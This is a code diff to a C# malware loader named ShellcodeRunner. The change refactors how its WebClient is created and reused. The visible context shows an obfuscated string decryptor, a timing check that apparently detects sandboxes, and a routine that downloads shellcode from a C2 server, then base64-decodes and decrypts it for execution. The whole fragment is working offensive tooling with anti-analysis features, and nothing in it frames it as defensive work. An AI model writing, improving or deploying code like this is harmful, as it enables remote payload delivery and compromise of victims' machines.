@@ -7,6 +7,8 @@ using Microsoft.Win32;
 
 public class ShellcodeRunner
 {
+    private static WebClient wc = null;
+
     private static string Decrypt(string enc)
     {
         string alph = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
@@ -28,9 +30,12 @@ public class ShellcodeRunner
         return (DateTime.Now.Subtract(now).TotalSeconds < 1.5);
     }
 
-    private static byte[] LoadShellcode(string address)
+    private static WebClient GetWebClient()
     {
-        WebClient wc = new WebClient();
+        if (wc != null)
+            return wc;
+
+        wc = new WebClient();
         try
         {
             // Attempt direct access to C2 server
@@ -64,8 +69,13 @@ public class ShellcodeRunner
             }
         }
 
+        return wc;
+    }
+
+    private static byte[] LoadShellcode(string address)
+    {
         // Download shellcode from C2
-        byte[] shellcode = wc.DownloadData(address);
+        byte[] shellcode = GetWebClient().DownloadData(address);
 
         // Decode and decrypt shellcode
         shellcode = Convert.FromBase64String(Encoding.Default.GetString(shellcode));
